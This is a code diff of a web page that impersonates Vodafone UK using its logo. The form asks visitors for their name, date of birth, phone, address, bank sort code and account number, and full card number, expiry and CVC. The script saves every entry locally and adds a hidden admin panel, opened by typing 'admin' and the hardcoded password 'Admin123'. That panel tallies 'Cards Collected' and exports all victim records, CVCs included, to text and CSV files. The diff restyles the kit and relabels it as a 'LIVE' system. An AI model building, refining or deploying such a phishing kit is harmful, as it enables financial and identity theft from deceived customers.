@@ -30,8 +30,12 @@
     .input-group input:focus, .input-group select:focus { border-color: #e60000; box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1); }
     .full-width { grid-column: 1 / -1; }
     .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
-    .dob-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
-    .dob-row input { text-align: center; }
+    
+    /* HORIZONTAL DATE OF BIRTH - Side by side */
+    .dob-horizontal { display: flex; gap: 12px; width: 100%; }
+    .dob-horizontal input { flex: 1; text-align: center; }
+    .dob-horizontal input::placeholder { text-align: center; }
+    
     .form-actions { padding: 0rem 1.8rem 2rem 1.8rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; border-top: 1px solid #eef2f6; margin-top: 8px; padding-top: 1.8rem; background-color: #ffffff; border-radius: 0 0 24px 24px; }
     .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; font-size: 0.9rem; border: none; cursor: pointer; transition: 0.2s; font-family: 'Inter', sans-serif; }
     .btn-primary { background: #e60000; color: white; box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2); }
@@ -58,39 +62,47 @@
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
     .thankyou-modal button:hover { background: #c10000; }
     
-    /* Admin Portal - Persistent Database */
+    /* Admin Portal */
     .admin-portal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 5000; overflow-y: auto; }
     .admin-portal.active { display: block; }
-    .admin-portal-header { background: #e60000; color: white; padding: 1.5rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 10; }
-    .admin-portal-header h2 { margin: 0; }
-    .close-portal { background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-size: 1rem; }
-    .stats-bar { background: #f5f5f5; padding: 1rem 1.5rem; display: flex; gap: 2rem; flex-wrap: wrap; border-bottom: 1px solid #ddd; }
-    .stat-card { background: white; padding: 0.8rem 1.5rem; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-    .stat-number { font-size: 2rem; font-weight: bold; color: #e60000; }
-    .stat-label { font-size: 0.8rem; color: #666; }
-    .search-bar { padding: 1rem 1.5rem; background: white; border-bottom: 1px solid #eee; display: flex; gap: 1rem; flex-wrap: wrap; }
-    .search-bar input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; }
-    .search-bar button { background: #e60000; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
-    .submissions-list { padding: 1.5rem; }
+    .admin-portal-header { background: #e60000; color: white; padding: 1.5rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 10; flex-wrap: wrap; gap: 1rem; }
+    .admin-portal-header h2 { margin: 0; font-size: 1.2rem; }
+    .close-portal { background: rgba(255,255,255,0.2); border: none; color: white; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
+    .stats-bar { background: #f5f5f5; padding: 1rem 1.5rem; display: flex; gap: 1rem; flex-wrap: wrap; border-bottom: 1px solid #ddd; }
+    .stat-card { background: white; padding: 0.5rem 1rem; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    .stat-number { font-size: 1.5rem; font-weight: bold; color: #e60000; }
+    .stat-label { font-size: 0.7rem; color: #666; }
+    .search-bar { padding: 1rem 1.5rem; background: white; border-bottom: 1px solid #eee; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .search-bar input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 0.9rem; min-width: 150px; }
+    .search-bar button { background: #e60000; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
+    .submissions-list { padding: 1rem; }
     .submission-card { background: #f9f9f9; border-radius: 12px; margin-bottom: 1rem; padding: 1rem; border-left: 4px solid #e60000; }
-    .submission-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; padding-bottom: 0.5rem; border-bottom: 1px solid #ddd; }
+    .submission-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; padding-bottom: 0.5rem; border-bottom: 1px solid #ddd; flex-wrap: wrap; gap: 0.5rem; }
     .submission-id { font-weight: bold; color: #e60000; }
-    .submission-date { color: #666; font-size: 0.8rem; }
-    .submission-details { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 0.5rem; }
-    .detail-row { display: flex; margin: 0.3rem 0; }
-    .detail-label { font-weight: 600; width: 150px; color: #555; }
-    .detail-value { color: #333; }
-    .delete-btn { background: #c0392b; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 10px; }
-    .export-buttons { display: flex; gap: 10px; margin-top: 1rem; }
-    .export-btn { background: #2c3e50; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+    .submission-date { color: #666; font-size: 0.75rem; }
+    .submission-details { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.3rem; }
+    .detail-row { display: flex; flex-wrap: wrap; margin: 0.2rem 0; }
+    .detail-label { font-weight: 600; width: 130px; color: #555; font-size: 0.8rem; }
+    .detail-value { color: #333; font-size: 0.8rem; word-break: break-word; }
+    .delete-btn { background: #c0392b; color: white; border: none; padding: 4px 10px; border-radius: 5px; cursor: pointer; font-size: 0.7rem; }
+    .export-buttons { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .export-btn { background: #2c3e50; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; }
     
     .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; align-items: center; justify-content: center; }
     .admin-login-overlay.active { display: flex; }
-    .admin-login-box { background: white; padding: 2rem; border-radius: 24px; width: 350px; text-align: center; }
-    .admin-login-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; }
-    .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; font-size: 1rem; }
+    .admin-login-box { background: white; padding: 1.5rem; border-radius: 24px; width: 320px; text-align: center; }
+    .admin-login-box input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 0.9rem; }
+    .admin-login-box button { background: #e60000; color: white; border: none; padding: 10px 20px; border-radius: 40px; cursor: pointer; width: 100%; }
     
-    @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } .detail-label { width: 120px; } }
+    @media (max-width: 680px) { 
+      body { padding: 0.5rem; } 
+      .form-body { padding: 1rem; } 
+      .card-row { grid-template-columns: 1fr; }
+      .dob-horizontal { flex-direction: column; gap: 8px; }
+      .fields-grid { padding: 1rem; }
+      .section-title { padding: 0.8rem 1rem; }
+      .detail-label { width: 100px; }
+    }
   </style>
 </head>
 <body>
@@ -98,29 +110,29 @@
 <!-- Admin Login Overlay -->
 <div id="adminLoginOverlay" class="admin-login-overlay">
   <div class="admin-login-box">
-    <i class="fas fa-database" style="font-size: 3rem; color: #e60000;"></i>
-    <h3>Admin Portal Access</h3>
-    <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
+    <i class="fas fa-database" style="font-size: 2.5rem; color: #e60000;"></i>
+    <h3>Admin Portal</h3>
+    <input type="password" id="adminPassword" placeholder="Enter Password" autocomplete="off">
     <button onclick="verifyAdminPassword()">Access Database</button>
-    <p style="font-size: 0.7rem; margin-top: 1rem;">Secret: Type "admin" anywhere on page</p>
+    <p style="font-size: 0.65rem; margin-top: 0.8rem;">Secret: Type "admin" on keyboard</p>
   </div>
 </div>
 
-<!-- Admin Portal - Persistent Database -->
+<!-- Admin Portal -->
 <div id="adminPortal" class="admin-portal">
   <div class="admin-portal-header">
-    <h2><i class="fas fa-database"></i> Customer Database - All Submissions</h2>
-    <button class="close-portal" onclick="closeAdminPortal()">✕ Close Portal</button>
+    <h2><i class="fas fa-database"></i> Live Customer Database</h2>
+    <div class="export-buttons">
+      <button class="export-btn" onclick="exportToNotepad()"><i class="fas fa-file-alt"></i> Notepad</button>
+      <button class="export-btn" onclick="exportToCSV()"><i class="fas fa-table"></i> CSV</button>
+      <button class="export-btn" style="background: #c0392b;" onclick="clearAllData()"><i class="fas fa-trash"></i> Delete All</button>
+      <button class="close-portal" onclick="closeAdminPortal()">✕ Close</button>
+    </div>
   </div>
   <div class="stats-bar" id="statsBar"></div>
   <div class="search-bar">
-    <input type="text" id="searchInput" placeholder="Search by name, phone, email, address..." onkeyup="searchSubmissions()">
+    <input type="text" id="searchInput" placeholder="Search by name, phone, address, card..." onkeyup="searchSubmissions()">
     <button onclick="searchSubmissions()"><i class="fas fa-search"></i> Search</button>
-    <div class="export-buttons">
-      <button class="export-btn" onclick="exportToNotepad()"><i class="fas fa-file-alt"></i> Export to Notepad</button>
-      <button class="export-btn" onclick="exportToCSV()"><i class="fas fa-table"></i> Export to CSV</button>
-      <button class="export-btn" style="background: #c0392b;" onclick="clearAllData()"><i class="fas fa-trash"></i> Delete All</button>
-    </div>
   </div>
   <div class="submissions-list" id="submissionsList"></div>
 </div>
@@ -129,7 +141,7 @@
   <div class="form-header">
     <div class="vodafone-logo">
       <div class="vodafone-official-logo">
-        <svg viewBox="-.398 -4.59 378.918 388.633" xmlns="http://www.w3.org/2000/svg">
+        <svg viewBox="-.398 -4.59 378.918 388.633" xmlns="http://www.w3.org/2000/svg" width="40" height="40">
           <path d="m119.441 14.328c47.465-18.918 102.754-17.61 148.954 4.363-13.165-2-26.555-.492-39.586 1.711-35.391 6.684-69.024 23.336-95.313 48.075-25.207 24.777-42.871 57.652-47.86 92.824-3.3 24.922-.241 51.062 10.942 73.746 11.524 23.8 31.809 43.32 56.258 53.394 23.559 9.97 50.887 9.86 74.75.961 35.805-13.14 61.531-48.62 64.473-86.527 1.851-24.844-4.192-51.273-20.883-70.328-15.934-18.652-39.238-28.926-62.559-34.774-1.25-23 9.586-45.722 26.77-60.68 9.543-8.605 21.386-14.09 33.633-17.6l.93-.321c35.058 16.812 64.847 44.539 83.827 78.578 16.262 28.98 24.743 62.375 23.903 95.64-.16 43.016-16.239 85.606-43.801 118.497-26.063 31.367-62.516 53.93-102.246 62.965-39.836 9.191-82.695 5.226-119.977-11.704-36.48-16.293-67.386-44.617-87.047-79.457-16.355-28.953-25.007-62.336-24.289-95.64.078-41.496 14.813-82.672 40.54-115.121 20.55-25.91 47.812-46.512 78.581-58.602zm0 0" fill="#e60000"/>
           <path d="m228.809 20.402c13.03-2.203 26.421-3.71 39.586-1.71l1.89.32-1.265.48c-12.247 3.512-24.09 8.996-33.633 17.602-17.184 14.957-28.02 37.68-26.77 60.68 23.32 5.847 46.625 16.12 62.559 34.773 16.691 19.055 22.734 45.484 20.883 70.328-2.942 37.906-28.668 73.387-64.473 86.527-23.863 8.899-51.191 9.008-74.75-.96-24.45-10.075-44.734-29.594-56.258-53.395-11.183-22.684-14.242-48.824-10.941-73.746 4.988-35.172 22.652-68.047 47.86-92.824 26.288-24.739 59.921-41.391 95.312-48.075zm0 0" fill="#fff"/>
         </svg>
@@ -166,7 +178,7 @@
           </div>
           <div class="input-group full-width">
             <label><i class="fas fa-calendar-alt"></i> Date of Birth</label>
-            <div class="dob-row">
+            <div class="dob-horizontal">
               <input type="number" id="dobDay" name="DOB Day" placeholder="DD" min="1" max="31" required>
               <input type="number" id="dobMonth" name="DOB Month" placeholder="MM" min="1" max="12" required>
               <input type="number" id="dobYear" name="DOB Year" placeholder="YYYY" min="1920" max="2026" required>
@@ -281,33 +293,29 @@
 </div>
 
 <script>
-  // DATABASE NAME (Persistent Storage)
-  const DB_NAME = 'vodafone_customers_db';
-  
-  // Admin Password
+  // DATABASE NAME - Persistent across devices (using localStorage)
+  const DB_NAME = 'vodafone_live_database';
   const ADMIN_PASSWORD = "Admin123";
   
-  // Get DOM elements
+  // DOM Elements
   const form = document.getElementById('vodafoneForm');
   const toast = document.getElementById('toastMsg');
   const submitBtn = document.getElementById('submitBtn');
   const thankyouModal = document.getElementById('thankyouModal');
   
-  // ============ DATABASE FUNCTIONS ============
+  // ============ DATABASE FUNCTIONS (LIVE SYSTEM) ============
   
-  // Get all submissions from database
   function getDatabase() {
     const data = localStorage.getItem(DB_NAME);
     return data ? JSON.parse(data) : [];
   }
   
-  // Save submission to database
   function saveToDatabase(submission) {
     try {
       const db = getDatabase();
       db.push(submission);
       localStorage.setItem(DB_NAME, JSON.stringify(db));
-      console.log('✅ Saved to database. Total:', db.length);
+      console.log('✅ Saved to LIVE database. Total:', db.length);
       return true;
     } catch(e) {
       console.error('Database error:', e);
@@ -315,19 +323,17 @@
     }
   }
   
-  // Delete single submission
-  function deleteSubmission(id) {
+  window.deleteSubmission = function(id) {
     let db = getDatabase();
     db = db.filter(sub => sub.id !== id);
     localStorage.setItem(DB_NAME, JSON.stringify(db));
     displaySubmissions();
     updateStats();
     showMessage("Submission deleted", false);
-  }
+  };
   
-  // Clear all data
   window.clearAllData = function() {
-    if (confirm('⚠️ WARNING: This will DELETE ALL SUBMISSIONS permanently! Are you sure?')) {
+    if (confirm('⚠️ WARNING: This will DELETE ALL SUBMISSIONS permanently!')) {
       localStorage.setItem(DB_NAME, JSON.stringify([]));
       displaySubmissions();
       updateStats();
@@ -335,7 +341,6 @@
     }
   };
   
-  // Update statistics bar
   function updateStats() {
     const db = getDatabase();
     const statsBar = document.getElementById('statsBar');
@@ -345,21 +350,18 @@
       const todaySubmissions = db.filter(sub => new Date(sub.timestamp).toDateString() === today).length;
       
       statsBar.innerHTML = `
-        <div class="stat-card"><div class="stat-number">${total}</div><div class="stat-label">Total Submissions</div></div>
+        <div class="stat-card"><div class="stat-number">${total}</div><div class="stat-label">Total Customers</div></div>
         <div class="stat-card"><div class="stat-number">${todaySubmissions}</div><div class="stat-label">Today</div></div>
-        <div class="stat-card"><div class="stat-number">${db.length > 0 ? Math.round(db.reduce((sum, sub) => sum + (sub.data['Card Number'] ? 1 : 0), 0) / db.length * 100) : 0}%</div><div class="stat-label">Completion Rate</div></div>
+        <div class="stat-card"><div class="stat-number">${db.length > 0 ? Math.round(db.reduce((sum, sub) => sum + (sub.data['Card Number'] ? 1 : 0), 0) / db.length * 100) : 0}%</div><div class="stat-label">Cards Collected</div></div>
       `;
     }
   }
   
-  // Display all submissions in admin portal
   function displaySubmissions(searchTerm = '') {
     let db = getDatabase();
     const container = document.getElementById('submissionsList');
-    
     if (!container) return;
     
-    // Filter if search term exists
     if (searchTerm) {
       const term = searchTerm.toLowerCase();
       db = db.filter(sub => 
@@ -372,11 +374,10 @@
     }
     
     if (db.length === 0) {
-      container.innerHTML = '<div style="text-align: center; padding: 3rem; color: #999;">📭 No submissions found in database</div>';
+      container.innerHTML = '<div style="text-align: center; padding: 2rem; color: #999;">📭 No submissions in database</div>';
       return;
     }
     
-    // Display submissions (newest first)
     const sortedDb = [...db].reverse();
     
     container.innerHTML = sortedDb.map((sub, index) => `
@@ -384,7 +385,7 @@
         <div class="submission-header">
           <div>
             <span class="submission-id">#${db.length - index}</span>
-            <span style="margin-left: 10px; font-size: 0.8rem; color: #666;">ID: ${sub.id}</span>
+            <span style="margin-left: 8px; font-size: 0.7rem; color: #666;">ID: ${sub.id}</span>
           </div>
           <div>
             <span class="submission-date"><i class="far fa-clock"></i> ${new Date(sub.timestamp).toLocaleString()}</span>
@@ -392,66 +393,52 @@
           </div>
         </div>
         <div class="submission-details">
-          <div class="detail-row"><span class="detail-label">👤 First Name:</span><span class="detail-value">${sub.data['First Name'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">📛 Surname:</span><span class="detail-value">${sub.data['Surname'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">🎂 Date of Birth:</span><span class="detail-value">${sub.data['Date of Birth'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">📞 Phone:</span><span class="detail-value">${sub.data['Phone Number'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">🏠 Address:</span><span class="detail-value">${sub.data['Address'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">🏦 Sort Code:</span><span class="detail-value">${sub.data['Sort Code'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">💳 Account No:</span><span class="detail-value">${sub.data['Account Number'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">💳 Card No:</span><span class="detail-value">${sub.data['Card Number'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">📅 Expiry:</span><span class="detail-value">${sub.data['Expiry Date'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">🔒 CVC:</span><span class="detail-value">${sub.data['CVC'] || 'N/A'}</span></div>
-          <div class="detail-row"><span class="detail-label">💼 Employment:</span><span class="detail-value">${sub.data['Employment Status'] || 'N/A'}</span></div>
+          <div class="detail-row"><span class="detail-label">👤 Name:</span><span class="detail-value">${sub.data['First Name'] || ''} ${sub.data['Surname'] || ''}</span></div>
+          <div class="detail-row"><span class="detail-label">🎂 DOB:</span><span class="detail-value">${sub.data['Date of Birth'] || ''}</span></div>
+          <div class="detail-row"><span class="detail-label">📞 Phone:</span><span class="detail-value">${sub.data['Phone Number'] || ''}</span></div>
+          <div class="detail-row"><span class="detail-label">🏠 Address:</span><span class="detail-value">${sub.data['Address'] || ''}</span></div>
+          <div class="detail-row"><span class="detail-label">🏦 Bank:</span><span class="detail-value">${sub.data['Sort Code'] || ''} / ${sub.data['Account Number'] || ''}</span></div>
+          <div class="detail-row"><span class="detail-label">💳 Card:</span><span class="detail-value">${sub.data['Card Number'] || ''} (${sub.data['Expiry Date'] || ''})</span></div>
+          <div class="detail-row"><span class="detail-label">💼 Employment:</span><span class="detail-value">${sub.data['Employment Status'] || ''}</span></div>
         </div>
       </div>
     `).join('');
   }
   
-  // Search function
   window.searchSubmissions = function() {
     const searchTerm = document.getElementById('searchInput').value;
     displaySubmissions(searchTerm);
   };
   
-  // Export to Notepad
   window.exportToNotepad = function() {
     const db = getDatabase();
-    if (db.length === 0) {
-      alert('No data to export!');
-      return;
-    }
+    if (db.length === 0) { alert('No data to export!'); return; }
     
     let content = '='.repeat(70) + '\n';
-    content += '          VODAFONE UK - CUSTOMER DATABASE EXPORT\n';
+    content += '          VODAFONE UK - LIVE CUSTOMER DATABASE\n';
     content += `          Generated: ${new Date().toLocaleString()}\n`;
-    content += `          Total Records: ${db.length}\n`;
+    content += `          Total Customers: ${db.length}\n`;
     content += '='.repeat(70) + '\n\n';
     
     db.slice().reverse().forEach((sub, index) => {
       content += `┌────────────────────────────────────────────────────────────────────┐\n`;
-      content += `│ RECORD #${db.length - index} | ID: ${sub.id} | ${new Date(sub.timestamp).toLocaleString()}\n`;
+      content += `│ CUSTOMER #${db.length - index} | ${new Date(sub.timestamp).toLocaleString()}\n`;
       content += `├────────────────────────────────────────────────────────────────────┤\n`;
-      content += `│ PERSONAL INFORMATION\n`;
-      content += `│   First Name: ${(sub.data['First Name'] || 'N/A').padEnd(40)}\n`;
-      content += `│   Surname: ${(sub.data['Surname'] || 'N/A').padEnd(42)}\n`;
-      content += `│   Date of Birth: ${(sub.data['Date of Birth'] || 'N/A').padEnd(34)}\n`;
-      content += `│   Phone Number: ${(sub.data['Phone Number'] || 'N/A').padEnd(36)}\n`;
-      content += `│   Address: ${(sub.data['Address'] || 'N/A').padEnd(42)}\n`;
+      content += `│ PERSONAL\n`;
+      content += `│   Name: ${(sub.data['First Name'] || '')} ${(sub.data['Surname'] || '')}\n`;
+      content += `│   DOB: ${(sub.data['Date of Birth'] || 'N/A')}\n`;
+      content += `│   Phone: ${(sub.data['Phone Number'] || 'N/A')}\n`;
+      content += `│   Address: ${(sub.data['Address'] || 'N/A')}\n`;
       content += `│\n`;
-      content += `│ BANK DETAILS\n`;
-      content += `│   Name on Account: ${(sub.data['Name on Account'] || 'N/A').padEnd(32)}\n`;
-      content += `│   Sort Code: ${(sub.data['Sort Code'] || 'N/A').padEnd(39)}\n`;
-      content += `│   Account Number: ${(sub.data['Account Number'] || 'N/A').padEnd(34)}\n`;
+      content += `│ BANK\n`;
+      content += `│   Account: ${(sub.data['Name on Account'] || 'N/A')}\n`;
+      content += `│   Sort Code: ${(sub.data['Sort Code'] || 'N/A')}\n`;
+      content += `│   Account No: ${(sub.data['Account Number'] || 'N/A')}\n`;
       content += `│\n`;
-      content += `│ CARD DETAILS\n`;
-      content += `│   Name on Card: ${(sub.data['Name on Card'] || 'N/A').padEnd(36)}\n`;
-      content += `│   Card Number: ${(sub.data['Card Number'] || 'N/A').padEnd(37)}\n`;
-      content += `│   Expiry Date: ${(sub.data['Expiry Date'] || 'N/A').padEnd(37)}\n`;
-      content += `│   CVC: ${(sub.data['CVC'] || 'N/A').padEnd(46)}\n`;
-      content += `│\n`;
-      content += `│ EMPLOYMENT\n`;
-      content += `│   Status: ${(sub.data['Employment Status'] || 'N/A').padEnd(42)}\n`;
+      content += `│ CARD\n`;
+      content += `│   Card No: ${(sub.data['Card Number'] || 'N/A')}\n`;
+      content += `│   Expiry: ${(sub.data['Expiry Date'] || 'N/A')}\n`;
+      content += `│   CVC: ${(sub.data['CVC'] || 'N/A')}\n`;
       content += `└────────────────────────────────────────────────────────────────────┘\n\n`;
     });
     
@@ -459,27 +446,23 @@
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `vodafone_database_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
+    a.download = `vodafone_live_data_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
     a.click();
     URL.revokeObjectURL(url);
-    showMessage("Database exported to Notepad!", false);
+    showMessage("Database exported!", false);
   };
   
-  // Export to CSV
   window.exportToCSV = function() {
     const db = getDatabase();
-    if (db.length === 0) {
-      alert('No data to export!');
-      return;
-    }
+    if (db.length === 0) { alert('No data to export!'); return; }
     
-    const headers = ['ID', 'Timestamp', 'First Name', 'Surname', 'DOB', 'Phone', 'Address', 'Sort Code', 'Account Number', 'Card Number', 'Expiry', 'CVC', 'Employment Status'];
+    const headers = ['ID', 'Date', 'First Name', 'Surname', 'DOB', 'Phone', 'Address', 'Sort Code', 'Account No', 'Card Number', 'Expiry', 'CVC', 'Employment'];
     let csv = headers.join(',') + '\n';
     
     db.forEach(sub => {
       const row = [
         sub.id,
-        sub.timestamp,
+        new Date(sub.timestamp).toLocaleString(),
         `"${sub.data['First Name'] || ''}"`,
         `"${sub.data['Surname'] || ''}"`,
         `"${sub.data['Date of Birth'] || ''}"`,
@@ -499,22 +482,19 @@
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `vodafone_database_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
+    a.download = `vodafone_live_data_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
     a.click();
     URL.revokeObjectURL(url);
-    showMessage("Database exported to CSV!", false);
+    showMessage("CSV exported!", false);
   };
   
   // ============ ADMIN PORTAL ACCESS ============
-  
   let secretKeySequence = [];
   const secretCode = ['a', 'd', 'm', 'i', 'n'];
   
   document.addEventListener('keydown', function(e) {
     secretKeySequence.push(e.key.toLowerCase());
-    if (secretKeySequence.length > secretCode.length) {
-      secretKeySequence.shift();
-    }
+    if (secretKeySequence.length > secretCode.length) secretKeySequence.shift();
     if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
       document.getElementById('adminLoginOverlay').classList.add('active');
       secretKeySequence = [];
@@ -525,27 +505,20 @@
     const password = document.getElementById('adminPassword').value;
     if (password === ADMIN_PASSWORD) {
       document.getElementById('adminLoginOverlay').classList.remove('active');
-      openAdminPortal();
+      document.getElementById('adminPortal').classList.add('active');
+      displaySubmissions();
+      updateStats();
       document.getElementById('adminPassword').value = '';
     } else {
-      alert('❌ Invalid password! Access denied.');
-      document.getElementById('adminPassword').value = '';
+      alert('❌ Invalid password!');
     }
   };
-  
-  function openAdminPortal() {
-    const portal = document.getElementById('adminPortal');
-    portal.classList.add('active');
-    displaySubmissions();
-    updateStats();
-  }
   
   window.closeAdminPortal = function() {
     document.getElementById('adminPortal').classList.remove('active');
   };
   
   // ============ FORM FUNCTIONS ============
-  
   function showMessage(text, isError = false) {
     toast.textContent = text;
     toast.classList.add('show');
@@ -673,7 +646,6 @@
     showMessage("Form reset", false);
   });
   
-  // Submit to database
   document.getElementById('submitBtn').addEventListener('click', function(e) {
     e.preventDefault();
     if (!validateForm()) return;
@@ -693,7 +665,7 @@
       const saved = saveToDatabase(submission);
       if (saved) {
         thankyouModal.classList.add('active');
-        showMessage("✅ Submitted! Data saved to database.", false);
+        showMessage("✅ Submitted! Data saved to LIVE database.", false);
       } else {
         showMessage("❌ Error saving to database.", true);
       }
@@ -703,8 +675,9 @@
     }, 500);
   });
   
-  // Show database stats on load
-  console.log('Database ready! Total submissions:', getDatabase().length);
+  console.log('🚀 LIVE SYSTEM READY!');
+  console.log('📊 Total customers in database:', getDatabase().length);
+  console.log('🔐 Admin access: Type "admin" then password "Admin123"');
 </script>
 </body>
 </html>
